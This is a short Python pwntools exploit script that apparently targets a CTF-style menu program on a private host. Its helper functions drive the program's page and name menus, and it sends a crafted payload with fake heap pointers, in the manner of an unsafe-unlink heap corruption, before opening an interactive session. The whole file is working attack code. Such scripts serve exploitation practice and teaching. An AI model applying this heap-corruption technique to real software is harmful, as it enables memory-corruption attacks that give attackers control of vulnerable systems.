from pwn import *

s = remote('192.168.50.4',1234)
def edit_page(dat):
  s.recvuntil('6.exit')
  s.send('2\n')
  s.recvuntil('poge:')
  s.send(dat)
def tear_page(size,dat):
  s.recvuntil('6.exit')
  s.send('3\n')
  s.recvuntil('(bytes):')
  s.send(str(size)+'\n')
  s.recvuntil('page:')
  s.send(dat)
def change_name(dat):
  s.recvuntil('6.exit')
  s.send('4\n')
  s.recvuntil('name:')
  s.send(dat)
def change_title(dat):
  s.recvuntil('6.exit')
  s.send('5\n')
  s.recvuntil('title:')
  s.send(dat)
#raw_input()
tear_page(0x200,'1234\n')
raw_input()
dat = ""
dat += "A"*16
dat += p64(0x602040-0x18)
dat += p64(0x602040-0x10)
dat += p64(0x20)
dat += 'A'
change_name(dat)
s.interactive()
